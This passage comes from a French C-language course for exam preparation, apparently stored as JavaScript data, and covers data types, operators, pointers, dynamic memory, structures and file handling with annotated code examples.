3   /* Contenu du header */
4   # endif

    En C++ moderne, on peut aussi utiliser : #pragma once`},{id:"1.3",c:1,t:"Types de données fondamentaux",x:`❖ Définition – Types primitifs en C

     Type             Taille (typique)          Plage          Description
     char             1 octet                −128 à 127        Caractère / petit entier
     unsigned char    1 octet                  0 à 255         Caractère non signé
     short            2 octets             −32 768 à 32 767    Entier court
     int              4 octets              ≈ ±2.1 × 109       Entier standard
     unsigned int     4 octets             0 à ≈ 4.2 × 109     Entier non signé
     long             4 ou 8 octets       Dépend du système    Entier long
     long long        8 octets              ≈ ±9.2 × 1018      Entier très long
     float            4 octets               ≈ 7 chiffres       Flottant simple précision
     double           8 octets               ≈ 15 chiffres      Flottant double précision
     long double      10-16 octets          ≈ 18+ chiffres      Flottant étendu
     void             –                           –            Type vide (pas de valeur)

    ✿ Règle – Règles de typage
        sizeof(char) est toujours égal à 1 (par définition)
        Garantie du standard : sizeof(char) ≤ sizeof(short) ≤ sizeof(int) ≤
         sizeof(long) ≤ sizeof(long long)
        Le type int fait au minimum 16 bits
        float suit la norme IEEE 754 (simple précision)
        double suit la norme IEEE 754 (double précision)
        Le type void ne peut pas être utilisé pour déclarer une variable

    ★ Astuce Concours
    Au concours, retenez : sizeof(int) = 4 (généralement), sizeof(char) = 1 toujours,
    sizeof(double) = 8, sizeof(float) = 4. L'opérateur sizeof retourne un size_t (entier non
    signé).`},{id:"1.4",c:1,t:"Variables et constantes",x:`❖ Définition – Variable
    Une variable est un espace mémoire nommé, de type défini, qui peut stocker une valeur modifi-
    able.
    Règles de nommage :
        Commence par une lettre ou un underscore _
        Contient des lettres, chiffres et underscores
        Sensible à la casse (age ̸= Age)
        Ne peut pas être un mot réservé du langage
        Les noms commençant par _ ou __ sont réservés au système

    ➣ Syntaxe – Déclaration et initialisation

1   int age ;                   /*    D'eclaration sans initialisation */
2   int age = 25;               /*    D'eclaration avec initialisation */
3   float pi = 3.14 f ;         /*    Le suffixe 'f ' indique un float */
4   double e = 2.718;           /*    Double par d'efaut */
5   char lettre = 'A ';         /*    Un caract è re entre apostrophes */

 6   const int MAX = 100;         /* Constante ( non modifiable ) */
 7   # define PI 3.14159          /* Macro constante ( pr'eprocesseur ) */

     ☞ Attention / Piège

         Une variable locale non initialisée contient une valeur indéterminée (garbage value)
         Les variables globales et statiques sont automatiquement initialisées à 0
         const en C ne crée pas une vraie constante de compilation (contrairement à C++)
         #define fait un remplacement textuel, pas de vérification de type !

     ✿ Règle – Classes de stockage

      Mot-clé     Portée                                    Durée de vie
      auto        Locale (bloc)                             Durée du bloc (par défaut)
      static      Locale (bloc) ou fichier                   Toute la durée du programme
      extern      Globale (multi-fichiers)                   Toute la durée du programme
      register    Locale (bloc)                             Durée du bloc (suggestion registre)
     Important : Une variable static dans une fonction conserve sa valeur entre les appels. Une
     variable static globale (ou fonction static) a une portée limitée au fichier.

     ➤ Exemple – Variable static

 1   void compteur () {
 2       static int n = 0; /* Initialis'e une seule fois */
 3       n ++;
 4       printf ( " Appel num'ero % d \\ n " , n ) ;
 5   }
 7   int main () {
 8       compteur () ; /* Appel num'ero 1 */
 9       compteur () ; /* Appel num'ero 2 */
10       compteur () ; /* Appel num'ero 3 */
11       return 0;
12   }`},{id:"1.5",c:1,t:"Opérateurs",x:`❖ Définition – Catégories d'opérateurs

    Catégorie               Opérateurs
    Arithmétiques           +, -, *, /, % (modulo)
    Relationnels            ==, !=, <, >, <=, >=
    Logiques                && (ET), || (OU), ! (NON)
    Bits à bits             &, |,  (XOR), ~ (complément), ,
    Affectation              =, +=, -=, *=, /=, %=, etc.
    Incrément/Décrément     ++, — (préfixe et postfixe)
    Ternaire                condition ? valeur_vrai : valeur_faux
    Taille                  sizeof()
    Adresse                 & (adresse de), * (déréférencement)
    Virgule                 , (évalue de gauche à droite, retourne la dernière)
    Cast                    (type)

    ✿ Règle – Priorité des opérateurs (du plus prioritaire au moins)

      1. () [] -> . (postfixe ++ —)
      2. ! ~ ++ — + - * & sizeof (type) (unaires, droite à gauche)
      3. * / %
      4. + -
      5.
      6. < <= > >=
      7. == !=
      8. & (ET bit à bit)
      9.  (XOR)
     10. | (OU bit à bit)
     11. &&
     12. ||
     13. ?: (ternaire)
     14. = += -= ... (affectation, droite à gauche)
     15. , (virgule)

    ☞ Attention / Piège – Pièges classiques des opérateurs

       = (affectation) vs == (comparaison) : if (x = 5) est toujours vrai !
       i++ : retourne la valeur avant incrémentation. ++i : incrémente puis retourne.
       Division entière : 5 / 2 = 2 (pas 2.5). Il faut caster : (float)5 / 2 = 2.5
       % ne fonctionne qu'avec des entiers
       && et || utilisent l'évaluation paresseuse (short-circuit)

    ➤ Exemple – Opérateurs bit à bit

1   int a = 5;      /* 0101 en binaire */
2   int b = 3;      /* 0011 en binaire */
4   a & b;     /*   AND : 0001 = 1 */
5   a | b;     /*   OR : 0111 = 7 */
6   a ^ b;     /*   XOR : 0110 = 6 */
7   ~a;        /*   NOT : ...1010 ( compl'ement ) */
8   a << 1;    /*   D'ecalage gauche : 1010 = 10 (×2) */
9   a >> 1;    /*   D'ecalage droit : 0010 = 2 (÷2) */

     Astuce : x  n équivaut à x × 2n et x  n équivaut à x ÷ 2n (division entière).`},{id:"1.6",c:1,t:"Conversion de types (Cast)",x:`✿ Règle – Conversions implicites
     Quand deux types différents sont mélangés dans une expression, le C effectue une promotion
     automatique vers le type le plus large :
     char → short → int → unsigned int → long → float → double → long double
     Attention : la conversion de float/double vers int tronque la partie décimale (pas d'arrondi).`},{id:"1.7",c:1,t:"Entrées / Sorties",x:`➣ Syntaxe – printf et scanf

 1   /* Affichage */
 2   printf ( " Entier : %d , Float : %.2 f , Char : % c \\ n " , 42 , 3.14 , 'A ') ;
 3   printf ( " String : %s , Adresse : % p \\ n " , " hello " , & x ) ;
 4   printf ( " Hexa : %x , Octal : %o , Long : % ld \\ n " , 255 , 255 , 100 L ) ;
 6   /* Lecture */
 7   int n ; float f ; char c ;     char nom [50];
 8   scanf ( " % d " , & n ) ;      /* Lire un entier (& obligatoire !) */
 9   scanf ( " % f " , & f ) ;      /* Lire un float */
10   scanf ( " % c " , & c ) ;      /* Espace avant % c pour ignorer \\ n */
11   scanf ( " %49 s " , nom ) ;    /* Lire une cha î ne ( pas de &) */
12   fgets ( nom , 50 , stdin ) ;   /* Lire une ligne compl è te */

                                %d       entier signé                              %u    entier non signé
                                %f       float/double                               %e    notation scientifique
                                %c       caractère                                 %s    chaîne
     Spécificateurs principaux :
                                %x       hexadécimal                               %o    octal
                                %p       adresse (pointeur)                        %ld   long int
                                %lf      double (scanf)                            %%    acher %

     ☞ Attention / Piège

         Oublier le & dans scanf cause un comportement indéfini (crash potentiel)
         Pour les chaînes (char[]), on n'utilise pas & car le nom du tableau est déjà une adresse
         scanf("%s") s'arrête au premier espace. Utiliser fgets() pour lire une ligne complète
         gets() est obsolète et dangereuse (buffer overflow) – ne jamais l'utiliser !`},{id:"1.8",c:1,t:"Structures de contrôle",x:`➣ Syntaxe – Conditions

 1   /* if / else if / else */
 2   if ( condition1 ) {
 3        /* bloc 1 */
 4   } else if ( condition2 ) {
 5        /* bloc 2 */
 6   } else {
 7        /* bloc par d'efaut */
 8   }
10   /* switch / case */
11   switch ( expression ) {
12       case valeur1 :
13            /* instructions */
14            break ;        /* OBLIGATOIRE sinon fall - through ! */
15       case valeur2 :
16       case valeur3 :      /* Cas group'es ( fall - through intentionnel ) */
17            /* instructions */
18            break ;
19       default :
20            /* cas par d'efaut */
21   }

     ✿ Règle – Règles du switch
         L'expression du switch doit être de type entier ou caractère (pas de float, pas de string)
         Les valeurs des case doivent être des constantes entières (pas de variables)
         Sans break, l'exécution continue dans les cas suivants (fall-through)
         default est optionnel mais recommandé

     ➣ Syntaxe – Boucles

 1   /* Boucle for */
 2   for ( int i = 0; i < 10; i ++) {
 3       printf ( " % d " , i ) ;
 4   }
 6   /* Boucle while ( test avant ) */
 7   while ( condition ) {
 8       /* instructions */
 9   }
11   /* Boucle do ... while ( test apr ès , ex'ecut'ee au moins 1 fois ) */
12   do {
13        /* instructions */
14   } while ( condition ) ; /* Point - virgule obligatoire ! */

     Instructions de contrôle de boucle :
         break : sort de la boucle immédiatement
         continue : passe à l'itération suivante
         goto label; : saut inconditionnel (à éviter en général)

 ★ Astuce Concours
 Boucle infinie : while(1) {...} ou for(;;) {...}
 Différence while vs do...while :
    while : la condition est testée avant ⇒ peut ne jamais exécuter le corps
    do...while : le corps est exécuté au moins une fois

  Chapitre
Fonctions en C 2`},{id:"2.1",c:2,t:"Définition et déclaration",x:`❖ Définition – Fonction
     Une fonction est un bloc de code nommé, réutilisable, qui effectue une tâche spécifique. Elle peut
     recevoir des paramètres (entrées) et retourner une valeur (sortie).

     ➣ Syntaxe – Structure d'une fonction

 1   /* Prototype ( d'eclaration ) - g'en'eralement dans un . h */
 2   type_retour nom_fonction ( type1 param1 , type2 param2 ) ;
 4   /* D'efinition ( impl'ementation ) - dans un . c */
 5   type_retour nom_fonction ( type1 param1 , type2 param2 ) {
 6        /* Corps de la fonction */
 7        return valeur ; /* Obligatoire si type_retour != void */
 8   }
10   /* Appel */
11   resultat = nom_fonction ( arg1 , arg2 ) ;

     ✿ Règle – Règles fondamentales
         En C, le passage de paramètres se fait toujours par valeur (copie)
         Pour modifier une variable de l'appelant, il faut passer un pointeur
         Un return dans une fonction void termine la fonction sans valeur
         Une fonction ne peut retourner qu'une seule valeur (utiliser struct ou pointeurs pour
          plusieurs)
         Le prototype doit être déclaré avant tout appel à la fonction
         void f(void) : ne prend aucun paramètres. void f() : prend un nombre quelconque (an-
          cien C)

     ➤ Exemple – Passage par valeur vs par adresse

 1   /* Passage par valeur : ne modifie PAS a et b dans main */
 2   void echangerVal ( int x , int y ) {
 3       int temp = x ; x = y ; y = temp ;
 4   }

 6   /* Passage par adresse : MODIFIE a et b dans main */
 7   void echangerAdr ( int *x , int * y ) {
 8       int temp = * x ; * x = * y ; * y = temp ;
 9   }
11   int main () {
12       int a = 5 , b = 10;
13       echangerVal (a , b ) ;        /* a =5 , b =10 ( inchang'e !) */
14       echangerAdr (& a , & b ) ;    /* a =10 , b =5 ( modifi'e !) */
15       return 0;
16   }`},{id:"2.2",c:2,t:"Récursivité",x:`❖ Définition – Fonction récursive
     Une fonction récursive est une fonction qui s'appelle elle-même. Elle doit avoir :
       1. Un cas de base (condition d'arrêt) pour éviter la récursion infinie
       2. Un cas récursif qui se rapproche du cas de base
     Chaque appel récursif crée un nouveau cadre de pile (stack frame) en mémoire.

     ➤ Exemple – Factorielle et Fibonacci

 1   /* Factorielle : n ! = n * (n -1) ! avec 0! = 1 */
 2   int factorielle ( int n ) {
 3       if ( n <= 1) return 1;             /* Cas de base */
 4       return n * factorielle ( n - 1) ; /* Cas r'ecursif */
 5   }
 7   /* Fibonacci : F ( n ) = F (n -1) + F (n -2) avec F (0) =0 , F (1) =1 */
 8   int fibonacci ( int n ) {
 9       if ( n <= 0) return 0;
10       if ( n == 1) return 1;
11       return fibonacci (n -1) + fibonacci (n -2) ;
12   }
13   /* Attention : complexit'e O (2^ n ) pour Fibonacci na ï f ! */

     ☞ Attention / Piège

         Sans cas de base ⇒ stack overflow (débordement de pile)
         La récursion utilise beaucoup de mémoire pile
         Fibonacci récursif naïf a une complexité O(2n ) – préférer la version itérative ou la mémoï-
          sation`},{id:"2.3",c:2,t:"Pointeurs de fonctions",x:`❖ Définition – Pointeur de fonction
     Un pointeur de fonction est une variable qui stocke l'adresse d'une fonction. Il permet
     d'appeler une fonction de manière indirecte.

     ➣ Syntaxe

 1   /* D'eclaration d ' un pointeur de fonction */
 2   int (* ptr_func ) ( int , int ) ; /* Pointe vers une fonction int f ( int , int )
        */
 4   /* Utilisation */
 5   int addition ( int a , int b ) { return a + b ; }
 6   int soustraction ( int a , int b ) { return a - b ; }
 8   ptr_func = addition ;             /* ou : ptr_func = & addition ; */
 9   int res = ptr_func (3 , 4) ;     /* res = 7 */
10   ptr_func = soustraction ;
11   res = ptr_func (3 , 4) ;         /* res = -1 */
13   /* Avec typedef pour simplifier */
14   typedef int (* Operation ) ( int , int ) ;
15   Operation op = addition ;

  Chapitre    3
Tableaux et Chaînes de Caractères`},{id:"3.1",c:3,t:"Tableaux unidimensionnels",x:`❖ Définition – Tableau (Array)
     Un tableau est une collection d'éléments de même type, stockés de manière contiguë en
     mémoire. La taille est fixe à la déclaration.

     ➣ Syntaxe

 1   int   tab [5];                       /* D'eclaration ( non initialis'e) */
 2   int   tab [5] = {1 , 2 , 3 , 4 , 5}; /* Initialisation compl è te */
 3   int   tab [5] = {1 , 2};             /* tab = {1 , 2 , 0 , 0 , 0} */
 4   int   tab [] = {1 , 2 , 3};          /* Taille d'eduite : 3 */
 5   int   tab [5] = {0};                 /* Tout à 0 */
 7   /* Acc è s */
 8   tab [0] = 10;       /* Premier 'el'ement ( indice 0) */
 9   tab [4] = 50;       /* Dernier 'el'ement ( indice taille -1) */
11   /* Taille d ' un tableau */
12   int n = sizeof ( tab ) / sizeof ( tab [0]) ; /* Nombre d ''el'ements */

     ✿ Règle – Règles des tableaux en C
         Les indices commencent à 0 et vont jusqu'à taille − 1
         Le C ne vérifie pas les limites du tableau (accès hors limites = comportement indéfini)
         Le nom du tableau est un pointeur constant vers le premier élément : tab ≡ &tab[0]
         On ne peut pas affecter un tableau à un autre : tab2 = tab1; est interdit
         La taille doit être connue à la compilation (sauf VLA en C99)
         Quand passé à une fonction, un tableau est converti en pointeur (on perd la taille)

     ➤ Exemple – Passage de tableau à une fonction
 1   /* On passe le tableau ET sa taille */
 2   void afficher ( int tab [] , int taille ) {       /* ou : int * tab */
 3       for ( int i = 0; i < taille ; i ++)
 4           printf ( " % d " , tab [ i ]) ;
 5       printf ( " \\ n " ) ;
 6   }

                                       3.2. TABLEAUX MULTIDIMENSIONNELS
 8   int main () {
 9       int t [] = {10 , 20 , 30 , 40 , 50};
10       int n = sizeof ( t ) / sizeof ( t [0]) ;
11       afficher (t , n ) ;
12       return 0;
13   }`},{id:"3.2",c:3,t:"Tableaux multidimensionnels",x:`➣ Syntaxe – Tableaux 2D (Matrices)

 1   /* D'eclaration */
 2   int matrice [3][4];            /* 3 lignes , 4 colonnes */
 3   int m [2][3] = {{1 ,2 ,3} , {4 ,5 ,6}};
 5   /* Acc è s */
 6   m [0][0] = 10;       /* Premi è re ligne , premi è re colonne */
 7   m [1][2] = 60;       /* Deuxi è me ligne , troisi è me colonne */
 9   /* Parcours */
10   for ( int i = 0; i < lignes ; i ++)
11       for ( int j = 0; j < colonnes ; j ++)
12            printf ( " % d " , matrice [ i ][ j ]) ;

     En mémoire : les éléments sont stockés ligne par ligne (row-major order). m[i][j] est à
     l'adresse : base + (i * colonnes + j) * sizeof(type)`},{id:"3.3",c:3,t:"Chaînes de caractères",x:`❖ Définition – Chaîne de caractères en C
     En C, une chaîne de caractères est un tableau de char terminé par le caractère nul '\\0' (valeur
     ASCII 0). Il n'existe pas de type string natif en C.

     ➣ Syntaxe

 1   char s1 [] = " Hello " ;                 /*   Taille = 6 (5 + '\\0 ') */
 2   char s2 [10] = " Hi " ;                  /*   s2 = { ' H ','i ' , '\\0 ' ,0 ,... ,0} */
 3   char s3 [] = { 'A ' , 'B ' , ' \\0 ' };   /*   É quivalent à " AB " */
 4   char * s4 = " Constante " ;              /*   Pointeur vers litt'eral ( non modifiable
        !) */

 ✿ Règle – Fonctions de <string.h>

  Fonction                   Description
  strlen(s)                  Longueur de la chaîne (sans '\\0')
  strcpy(dest, src)          Copie src dans dest
  strncpy(dest, src, n)      Copie au plus n caractères
  strcat(dest, src)          Concatène src à la fin de dest
  strncat(dest, src, n)      Concatène au plus n caractères
  strcmp(s1, s2)             Compare : 0 si égales, < 0 si s1<s2, > 0 si s1>s2
  strncmp(s1, s2, n)         Compare les n premiers caractères
  strchr(s, c)               Cherche le caractère c dans s (première occurrence)
  strrchr(s, c)              Cherche c (dernière occurrence)
  strstr(s1, s2)             Cherche la sous-chaîne s2 dans s1
  sprintf(buf, fmt, ...)     Écriture formatée dans une chaîne
  atoi(s)                    Convertit chaîne en int
  atof(s)                    Convertit chaîne en double

 ☞ Attention / Piège
     strcpy et strcat ne vérifient pas la taille du buffer ⇒ buffer overflow possible !
     Ne jamais comparer deux chaînes avec == (compare les adresses, pas le contenu). Utiliser
      strcmp().
     Ne pas oublier l'espace pour '\\0' : "Hello" nécessite 6 octets, pas 5
     strlen() parcourt la chaîne à chaque appel ⇒ O(n). Ne pas l'appeler dans une boucle for
      !

 ★ Astuce Concours
 Caractères spéciaux (séquences d'échappement) :
  \\n   Saut de ligne                          \\t Tabulation
  \\0   Caractère nul                          \\\\ Antislash
  \\'   Apostrophe                             \\" Guillemet
  \\a   Bip sonore                             \\r Retour chariot
 Table ASCII : '0' = 48, 'A' = 65, 'a' = 97, '\\0' = 0. Pour convertir un chiffre-caractère en
 entier : c - '0'.

 Chapitre
Pointeurs 4`},{id:"4.1",c:4,t:"Concepts fondamentaux",x:`❖ Définition – Pointeur
    Un pointeur est une variable qui contient l'adresse mémoire d'une autre variable. Sa taille
    dépend de l'architecture : 4 octets (32 bits) ou 8 octets (64 bits), quel que soit le type pointé.
    Deux opérateurs fondamentaux :
        & (adresse de) : donne l'adresse d'une variable
        * (déréférencement / indirection) : accède à la valeur à l'adresse

    ➣ Syntaxe

1   int x = 42;
2   int * p = & x ;          /* p contient l ' adresse de x */
4   printf ( " % d \\ n " , * p ) ;   /* 42 ( valeur point'ee ) */
5   printf ( " % p \\ n " , p ) ;     /* adresse de x ( ex : 0 x7fff5c3a ) */
6   printf ( " % p \\ n " , & p ) ;   /* adresse du pointeur p lui - m ê me */
8   * p = 100;               /* Modifie x à travers le pointeur */
9   printf ( " % d \\ n " , x ) ;    /* 100 */

    ✿ Règle – Règles des pointeurs
        Un pointeur doit être initialisé avant utilisation (sinon comportement indéfini)
        NULL (ou 0) représente un pointeur qui ne pointe sur rien
        Le type du pointeur détermine comment les données pointées sont interprétées
        void * est un pointeur générique (peut pointer sur n'importe quel type)
        Un void * ne peut pas être déréférencé sans cast
        Arithmétique : p + 1 avance de sizeof(*p) octets (pas de 1 octet !)`},{id:"4.2",c:4,t:"Arithmétique des pointeurs",x:`❖ Définition – Opérations sur les pointeurs
         p + n : avance de n * sizeof(*p) octets
         p - n : recule de n * sizeof(*p) octets
         p1 - p2 : nombre d'éléments entre les deux pointeurs (du même type)
         p++, p— : avance/recule d'un élément
         Comparaison : p1 == p2, p1 < p2, etc. (même tableau uniquement)
     Relation pointeur-tableau : tab[i] ≡ *(tab + i) et &tab[i] ≡ tab + i

     ➤ Exemple – Parcours d'un tableau avec pointeur

 1   int tab [] = {10 , 20 , 30 , 40 , 50};
 2   int * p = tab ;             /* p pointe sur tab [0] */
 4   for ( int i = 0; i < 5; i ++) {
 5       printf ( " % d " , *( p + i ) ) ; /* É quivalent à tab [ i ] */
 6   }
 7   /* ou : */
 8   for ( int * q = tab ; q < tab + 5; q ++) {
 9       printf ( " % d " , * q ) ;
10   }`},{id:"4.3",c:4,t:"Pointeurs et tableaux 2D",x:`✿ Règle
     Pour un tableau int m[L][C] :
         m est de type int (*)[C] (pointeur vers un tableau de C entiers)
         m[i] est de type int * (pointeur vers le premier élément de la ligne i)
         m[i][j] ≡ *(*(m + i) + j) ≡ *(m[i] + j)
         Adresse de m[i][j] = adresse de base + (i * C + j) * sizeof(int)`},{id:"4.4",c:4,t:"Pointeurs de pointeurs",x:`➣ Syntaxe

 1   int   x = 42;
 2   int   *p = &x;             /* Pointeur vers int */
 3   int   ** pp = & p ;        /* Pointeur vers pointeur vers int */
 4   int   *** ppp = & pp ;     /* Triple pointeur */
 6   printf ( " % d \\ n " , ** pp ) ;   /* 42 */
 7   printf ( " % d \\ n " , *** ppp ) ; /* 42 */
 9   /* Usage classique : tableau dynamique 2 D */
10   int ** matrice = ( int **) malloc ( lignes * sizeof ( int *) ) ;
11   for ( int i = 0; i < lignes ; i ++)
12       matrice [ i ] = ( int *) malloc ( colonnes * sizeof ( int ) ) ;`},{id:"4.5",c:4,t:"Pointeur const",x:`✿ Règle – Les différentes combinaisons

1   int x = 10 , y = 20;
3   const int * p1 = & x ;     /* Pointeur vers const : * p1 non modifiable , p1
       modifiable */
4   int * const p2 = & x ;     /* Pointeur const : * p2 modifiable , p2 non
       modifiable */
5   const int * const p3 = & x ; /* Les deux sont non modifiables */

    Astuce de lecture : lire de droite à gauche.
        const int *p : p est un pointeur vers un int constant
        int *const p : p est un pointeur constant vers un int

 Chapitre     5
Allocation Dynamique de Mémoire`},{id:"5.1",c:5,t:"Organisation de la mémoire",x:`◆ Mémoire – Les zones mémoire d'un programme C
       1. Zone de code (Text) : code exécutable (lecture seule)
       2. Données statiques (Data/BSS) : variables globales et statiques
             Data : variables initialisées
             BSS : variables non initialisées (à 0 par défaut)
       3. Pile (Stack) : variables locales, paramètres, adresses de retour. Croissance vers les adresses
          basses. Taille limitée (souvent 1-8 Mo).
       4. Tas (Heap) : mémoire allouée dynamiquement (malloc, new). Croissance vers les adresses
          hautes. Taille limitée par la RAM disponible.
                                     Pile (Stack)                             Tas (Heap)
                   Allocation        Automatique                              Manuelle (malloc/free)
     Pile vs Tas : Vitesse           Très rapide                              Plus lente
                   Taille            Limitée                                  Vaste
                   Libération        Automatique                              Manuelle (risque de fuite)
                   Fragmentation     Non                                      Oui`},{id:"5.2",c:5,t:"Fonctions d'allocation (<stdlib.h>)",x:`➣ Syntaxe

 1   /* malloc : alloue n octets , m'emoire NON initialis'ee */
 2   int * p = ( int *) malloc (10 * sizeof ( int ) ) ;
 4   /* calloc : alloue n blocs de taille donn'ee , initialis'es à 0 */
 5   int * p = ( int *) calloc (10 , sizeof ( int ) ) ;
 7   /* realloc : redimensionne un bloc d'ej à allou'e */
 8   p = ( int *) realloc (p , 20 * sizeof ( int ) ) ;
10   /* free : lib è re la m'emoire allou'ee */
11   free ( p ) ;
12   p = NULL ; /* Bonne pratique : 'eviter le dangling pointer */

                                 5.2.MÉMOIRE
                                      FONCTIONS D'ALLOCATION (<STDLIB.H>)
     ✿ Règle – Règles de l'allocation dynamique
          Toujours vérifier le retour de malloc/calloc/realloc (retourne NULL si échec)
          Chaque malloc doit avoir un free correspondant
          Ne jamais libérer deux fois la même zone (double free)
          Ne jamais utiliser un pointeur après free (dangling pointer)
          Mettre le pointeur à NULL après free
          En C, le cast de malloc est optionnel mais recommandé pour compatibilité C++
          En C++, le cast est obligatoire (pas de conversion implicite void* → T*)

     ☞ Attention / Piège – Erreurs mémoire courantes

          Fuite mémoire (memory leak) : oublier de free() la mémoire allouée
          Dangling pointer : utiliser un pointeur après free()
          Double free : appeler free() deux fois sur le même pointeur
          Buffer overflow : écrire au-delà de la zone allouée
          Use after free : accéder à la mémoire libérée
          Stack overflow : récursion trop profonde ou tableau local trop grand

     ➤ Exemple – Tableau dynamique complet

 1   # include < stdio .h >
 2   # include < stdlib .h >
 4   int main () {
 5       int n ;
 6       printf ( " Taille du tableau : " ) ;
 7       scanf ( " % d " , & n ) ;
 9        /* Allocation */
10        int * tab = ( int *) malloc ( n * sizeof ( int ) ) ;
11        if ( tab == NULL ) {
12             fprintf ( stderr , " Erreur d ' allocation !\\ n " ) ;
13             return 1;
14        }
16        /* Remplissage */
17        for ( int i = 0; i < n ; i ++)
18            tab [ i ] = i * 10;
20        /* Redimensionnement */
21        int * temp = ( int *) realloc ( tab , 2 * n * sizeof ( int ) ) ;
22        if ( temp == NULL ) {
23             free ( tab ) ;
24             return 1;
25        }
26        tab = temp ;
28        /* Lib'eration */
29        free ( tab ) ;
30        tab = NULL ;
31        return 0;
32   }

  Chapitre     6
Structures, Unions et Énumérations`},{id:"6.1",c:6,t:"Structures (struct)",x:`❖ Définition – Structure
     Une structure est un type de données composé qui regroupe des variables de types différents
     sous un même nom. Chaque variable est appelée un champ (ou membre).

     ➣ Syntaxe

 1   /* D'eclaration */
 2   struct Etudiant {
 3        char nom [50];
 4        int age ;
 5        float moyenne ;
 6   };
 8   /* D'eclaration avec typedef */
 9   typedef struct {
10        char nom [50];
11        int age ;
12        float moyenne ;
13   } Etudiant ;
15   /* Initialisation */
16   Etudiant e1 = { " Ali " , 22 , 15.5};
17   struct Etudiant e2 = {. nom = " Sara " , . age = 21 , . moyenne = 16.0}; /* C99
         */
19   /* Acc è s aux champs */
20   e1 . age = 23;                     /* Avec . ( variable ) */
21   Etudiant * p = & e1 ;
22   p - > age = 24;                    /* Avec -> ( pointeur ) */
23   (* p ) . age = 24;                 /* É quivalent à p - > age */

     ✿ Règle – Règles des structures
         sizeof(struct) peut être supérieur à la somme des tailles des champs à cause du padding
          (alignement mémoire)
         Les structures peuvent être copiées par affectation (s2 = s1;) – copie superficielle

         Les structures peuvent être passées par valeur à une fonction (copie complète)
         Pour l'ecacité, passer les structures par pointeur
         Une structure peut contenir un pointeur vers elle-même (structures auto-référentielles
          pour les listes chaînées)
         Une structure ne peut pas se contenir elle-même directement

     ➤ Exemple – Liste chaînée simple

 1   typedef struct Noeud {
 2       int valeur ;
 3       struct Noeud * suivant ;       /* Pointeur vers le prochain noeud */
 4   } Noeud ;
 6   /* Cr'eer un noeud */
 7   Noeud * creerNoeud ( int val ) {
 8       Noeud * n = ( Noeud *) malloc ( sizeof ( Noeud ) ) ;
 9       if ( n != NULL ) {
10            n - > valeur = val ;
11            n - > suivant = NULL ;
12       }
13       return n ;
14   }
16   /* Insertion en t ê te */
17   void insererTete ( Noeud ** tete , int val ) {
18       Noeud * n = creerNoeud ( val ) ;
19       n - > suivant = * tete ;
20       * tete = n ;
21   }`},{id:"6.2",c:6,t:"Unions (union)",x:`❖ Définition – Union
     Une union est similaire à une structure, mais tous les membres partagent le même espace
     mémoire. La taille de l'union est égale à la taille de son plus grand membre. Un seul membre
     peut être utilisé à la fois.

     ➣ Syntaxe

 1   union Valeur {
 2       int entier ;         /* 4 octets */
 3       float flottant ;     /* 4 octets */
 4       char texte [20];     /* 20 octets */
 5   };
 6   /* sizeof ( union Valeur ) = 20 ( taille du plus grand membre ) */
 8   union Valeur v ;
 9   v . entier = 42;           /* Seul v . entier est valide */
10   v . flottant = 3.14;       /* Maintenant seul v . flottant est valide */`},{id:"6.3",c:6,t:"Énumérations (enum)",x:`❖ Définition – Énumération
    Une énumération définit un ensemble de constantes entières nommées. Par défaut, la première
    constante vaut 0 et chaque suivante est incrémentée de 1.

    ➣ Syntaxe

1   enum Jour { LUNDI , MARDI , MERCREDI , JEUDI , VENDREDI , SAMEDI , DIMANCHE };
2   /* LUNDI =0 , MARDI =1 , ... , DIMANCHE =6 */
4   enum Couleur { ROUGE = 1 , VERT = 5 , BLEU = 10};
5   /* Valeurs personnalis'ees */
7   enum Jour j = MERCREDI ;      /* j = 2 */`},{id:"6.4",c:6,t:"Champs de bits",x:`❖ Définition – Champ de bits
    Les champs de bits permettent de définir des membres de structure avec un nombre précis de
    bits. Utile pour l'optimisation mémoire et la manipulation de registres matériels.

    ➣ Syntaxe

1   struct Registre {
2       unsigned int actif : 1;            /* 1 bit : 0 ou 1 */
3       unsigned int mode : 3;             /* 3 bits : 0 à 7 */
4       unsigned int priorite : 4;         /* 4 bits : 0 à 15 */
5   };

 Chapitre      7
Gestion des Fichiers en C
     ❖ Définition – Fichier
     Un fichier est une séquence d'octets stockée sur un support de stockage. En C, on manipule les
     fichiers via un pointeur de type FILE * défini dans <stdio.h>.

     ➣ Syntaxe – Opérations de base

 1   FILE * f ;
 3   /* Ouverture */
 4   f = fopen ( " fichier . txt " , " r " ) ; /* Ouverture en lecture */
 5   if ( f == NULL ) {
 6        perror ( " Erreur d ' ouverture " ) ;
 7        return 1;
 8   }
10   /* Lecture / É criture */
11   /* ... */
13   /* Fermeture ( obligatoire !) */
14   fclose ( f ) ;

     ✿ Règle – Modes d'ouverture

      Mode               Description
      "r"                Lecture seule. Le fichier doit exister.
      "w"                Écriture seule. Crée ou écrase le fichier.
      "a"                Ajout. Crée le fichier s'il n'existe pas. Écrit à la fin.
      "r+"               Lecture et écriture. Le fichier doit exister.
      "w+"               Lecture et écriture. Crée ou écrase.
      "a+"               Lecture et ajout. Crée si nécessaire.
      "rb", "wb", etc.   Mode binaire (ajout du b).

     ✿ Règle – Fonctions de lecture/
                                    écriture

      Fonction                         Description
      fgetc(f) / fputc(c, f)           Lire/écrire un caractère
      fgets(buf, n, f)                 Lire une ligne (max n-1 caractères)
      fputs(s, f)                      Écrire une chaîne
      fprintf(f, fmt, ...)             Écriture formatée (comme printf)
      fscanf(f, fmt, ...)              Lecture formatée (comme scanf)
      fread(buf, taille, nb, f)        Lecture binaire
      fwrite(buf, taille, nb, f)       Écriture binaire
      fseek(f, offset, origine)        Déplacer le curseur
      ftell(f)                         Position actuelle du curseur
      rewind(f)                        Revenir au début
      feof(f)                          Vrai si fin de fichier atteinte

     ➤ Exemple – Lire et écrire dans un fichier

 1   /* É criture */
 2   FILE * f = fopen ( " notes . txt " , " w " ) ;
 3   if ( f != NULL ) {
 4        fprintf (f , " Ali : %.2 f \\ n " , 15.5) ;
 5        fprintf (f , " Sara : %.2 f \\ n " , 17.0) ;
 6        fclose ( f ) ;
 7   }
 9   /* Lecture ligne par ligne */
10   f = fopen ( " notes . txt " , " r " ) ;
11   char ligne [256];
12   while ( fgets ( ligne , sizeof ( ligne ) , f ) != NULL ) {
13       printf ( " % s " , ligne ) ;
14   }
15   fclose ( f ) ;
17   /* Lecture /'ecriture binaire ( structures ) */
18   Etudiant e = { " Ali " , 22 , 15.5};
19   FILE * fb = fopen ( " etudiants . dat " , " wb " ) ;
20   fwrite (& e , sizeof ( Etudiant ) , 1 , fb ) ;
21   fclose ( fb ) ;

     ★ Astuce Concours
